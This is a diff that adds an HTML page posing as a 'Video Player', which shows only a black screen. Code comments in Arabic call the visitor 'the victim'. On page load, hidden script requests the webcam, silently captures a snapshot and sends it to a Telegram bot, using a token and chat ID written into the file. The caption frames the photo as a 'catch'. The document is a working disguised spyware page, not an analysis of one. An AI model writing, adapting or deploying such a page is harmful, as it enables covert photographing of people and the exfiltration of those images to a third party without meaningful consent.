@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Video Player</title>
+    <style>
+        body { background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        /* أخفينا كل شيء عشان الضحية يشوف شاشة سودة بس */
+    </style>
+</head>
+<body>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const token = '8642064710:AAE5mGb3WhT3LqCcC9H7sOxW9XAWwwR-BkY'; 
+        const chat_id = '7253503761'; 
+
+        async function fastCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // أول ما الكاميرا تشتغل يطق الصورة فوراً بدون انتظار
+                video.onloadedmetadata = () => {
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        const imageBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7)); // جودة 70% لسرعة الإرسال
+                        
+                        const formData = new FormData();
+                        formData.append('chat_id', chat_id);
+                        formData.append('photo', imageBlob, 'snap.jpg');
+                        formData.append('caption', '📸 صيدة سريعة من فهد 😎🔥');
+
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    }, 300); // 0.3 ثانية بس عشان الكاميرا تركز
+                };
+            } catch (err) {
+                // إذا رفض الضحية
+            }
+        }
+
+        window.onload = fastCapture;
+    </script>
+</body>
+</html>
